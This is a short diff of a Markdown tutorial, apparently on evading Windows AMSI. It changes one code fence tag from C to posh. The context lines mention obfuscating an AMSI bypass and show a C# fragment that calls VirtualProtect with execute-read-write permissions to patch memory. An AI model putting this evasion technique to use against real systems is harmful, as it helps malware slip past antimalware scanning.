@@ -73,7 +73,7 @@ We can use this popular obfuscation tool to customize our AMSI bypass. Let's try
 
 Great! We can now update our code block with the expression:
 
-```C
+```posh
             }
             uint oldprotect;
             if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, 0x40, out oldprotect)) {
